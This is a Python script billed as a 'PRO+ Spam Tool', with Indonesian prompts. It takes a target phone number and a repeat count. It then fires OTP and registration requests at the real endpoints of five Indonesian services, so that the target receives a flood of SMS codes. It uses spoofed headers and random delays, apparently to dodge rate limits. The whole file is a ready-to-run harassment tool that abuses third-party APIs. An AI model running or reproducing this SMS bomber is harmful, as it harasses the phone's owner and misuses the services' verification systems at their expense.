# PRO+ Version by MR.M05T3R
try:
    import os, sys, time, random, json, requests
    from colorama import Fore, init
    from tqdm import tqdm
except ModuleNotFoundError:
    os.system("pip install colorama requests tqdm")
    import os, sys, time, random, json, requests
    from colorama import Fore, init
    from tqdm import tqdm

init(autoreset=True)

# Colors
R = Fore.RED
G = Fore.GREEN
Y = Fore.YELLOW
C = Fore.CYAN
W = Fore.WHITE

def loading_animation(text, duration=2):
    for _ in range(duration):
        for frame in "|/-\\":
            print(f"\r{C}{text} {frame}", end="")
            time.sleep(0.1)
    print("\r", end="")

def random_delay():
    return random.uniform(2, 5)  # delay 2-5 detik random

def send_request(api_name, url, headers, data, method='POST'):
    try:
        if method == 'POST':
            response = requests.post(url, headers=headers, data=json.dumps(data), timeout=10)
        else:
            response = requests.get(url, headers=headers, params=data, timeout=10)
        return response
    except Exception as e:
        return None

def spammer(phone_number, total):
    success = 0
    fail = 0

    api_list = [
        {
            "name": "Dekoruma",
            "url": "https://auth.dekoruma.com/api/v1/register/request-otp-phone-number/?format=json",
            "headers": {
                "Host": "auth.dekoruma.com",
                "Content-Type": "application/json",
                "Origin": "https://m.dekoruma.com",
                "User-Agent": "Mozilla/5.0 (Linux; Android 10)"
            },
            "data": lambda phone: {"phoneNumber": phone, "platform": "sms"},
            "method": "POST"
        },
        {
            "name": "Tokko",
            "url": "https://api.tokko.io/graphql",
            "headers": {
                "Host": "api.tokko.io",
                "Content-Type": "application/json",
                "Origin": "https://web.lummoshop.com",
                "User-Agent": "Mozilla/5.0 (Linux; Android 10)"
            },
            "data": lambda phone: {
                "operationName": "generateOTP",
                "variables": {
                    "generateOtpInput": {
                        "phoneNumber": phone,
                        "hashCode": "",
                        "channel": "SMS",
                        "userType": "MERCHANT"
                    }
                },
                "query": "mutation generateOTP($generateOtpInput: GenerateOtpInput!) { generateOtp(generateOtpInput: $generateOtpInput) { phoneNumber } }"
            },
            "method": "POST"
        },
        {
            "name": "OLX",
            "url": "https://www.olx.co.id/api/auth/authenticate",
            "headers": {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0 (Linux; Android 10)"
            },
            "data": lambda phone: {
                "grantType": "retry",
                "method": "sms",
                "phone": phone.replace("+", ""),  # OLX tidak pakai +
                "language": "id"
            },
            "method": "POST"
        },
        {
            "name": "Callind",
            "url": "https://api.callind.com/api/v1/auth/register",
            "headers": {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0 (Linux; Android 10)"
            },
            "data": lambda phone: {"phone": phone},
            "method": "POST"
        },
        {
            "name": "Matahari",
            "url": "https://www.matahari.com/rest/V1/thor-authentication/token",
            "headers": {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0 (Linux; Android 10)"
            },
            "data": lambda phone: {"username": phone},
            "method": "POST"
        }
    ]

    print(f"\n{W}[{G}+{W}] Mulai mengirim spam ke {Y}{phone_number} {W}sebanyak {Y}{total}{W}x\n")

    for _ in tqdm(range(total), desc="Progress", ncols=75, colour='CYAN'):
        selected_api = random.choice(api_list)
        payload = selected_api["data"](phone_number)
        response = send_request(selected_api["name"], selected_api["url"], selected_api["headers"], payload, selected_api["method"])

        if response and response.status_code in [200, 201]:
            print(f"{W}[{G}✓{W}] {selected_api['name']} - {G}Success")
            success += 1
        else:
            print(f"{W}[{R}✗{W}] {selected_api['name']} - {R}Failed")
            fail += 1

        time.sleep(random_delay())

    print(f"\n{W}[{G}+{W}] Total sukses: {G}{success} {W}| Total gagal: {R}{fail}\n")
    print(f"{C}Selesai spam ke {phone_number}.\n")

def banner():
    os.system("clear")
    print(f"""{C}
╔═╗┬ ┬┬─┐┬ ┬┌─┐┬─┐
║ ╦│ │├┬┘│ ││ │├┬┘
╚═╝└─┘┴└─└─┘└─┘┴└─
{W}PRO+ Spam Tool | by {Y}MR.M05T3R
""")

if __name__ == "__main__":
    banner()
    try:
        phone = input(f"{W}[{Y}?{W}] Masukkan Nomor (ex: +62812xxxx) {R}:{G} ").strip()
        if not phone.startswith('+') or not phone[1:].isdigit():
            print(f"{W}[{R}!{W}] Format salah! Harus awali dengan + dan angka saja.")
            sys.exit()
        total = int(input(f"{W}[{Y}?{W}] Berapa kali spam {R}:{G} "))
        loading_animation("Memulai")
        spammer(phone, total)
    except KeyboardInterrupt:
        print(f"\n{W}[{R}!{W}] Dibatalkan pengguna")
        sys.exit()
    except Exception as e:
        print(f"{W}[{R}Error{W}] {e}")
        sys.exit()
